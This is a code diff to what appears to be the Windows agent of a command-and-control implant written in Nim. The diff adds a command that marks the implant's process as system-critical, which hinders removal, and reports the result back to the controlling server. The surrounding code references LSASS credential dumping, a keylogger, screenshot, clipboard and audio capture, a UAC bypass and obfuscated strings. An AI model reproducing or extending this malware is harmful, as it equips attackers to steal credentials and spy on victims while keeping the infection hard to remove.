@@ -2,7 +2,7 @@
 import ../config
 import ../common
 import utils/incl/[evillsasstwin]
-import utils/[audio, clipboard, clr, helpers, memops, lsass, screenshot, keylogger, mutex]
+import utils/[audio, clipboard, clr, helpers, memops, lsass, screenshot, keylogger, mutex, critical]
 # External imports
 import std/[tables, nativesockets, json]
 import wAuto/[registry, window]
@@ -45,6 +45,7 @@ proc set_spe(process_name: string, cmd: string): bool
 proc uac_bypass(bypass_method: string, cmd: string): bool
 proc msgbox(title: string, text: string) {.gcsafe.}
 proc speak(text: string): bool
+proc wrap_set_critical(is_critical: bool): bool
 
 # Helpers
 proc get_windows_agent_id*(): string
@@ -577,6 +578,19 @@ proc speak(text: string): bool =
     return is_success
 
 
+proc wrap_set_critical(is_critical: bool): bool =
+
+    var is_success = set_critical(is_critical) == 0
+    
+    var data = {
+        protectString("is_critical"): $is_critical,
+        protectString("is_success"): $is_success
+    }.toOrderedTable()
+
+    is_success = post_data(client, protectString("critical") , $data)
+    return is_success
+
+
 #########################
 ######## Helpers ########
 #########################
@@ -720,6 +734,8 @@ proc windows_parse_command*(command: JsonNode): bool =
             discard post_data(client, protectString("msgbox") , $data)
         of protectString("speak"):
             is_success = speak(command["text"].getStr())
+        of protectString("critical"):
+            is_success = wrap_set_critical(parseBool(command[protectString("is_critical")].getStr()))
         of protectString("sleep"):
             is_success = change_sleep_time(client, command[protectString("timeframe")].getInt(), command[protectString("jitter_percent")].getInt())
         of protectString("collect"):
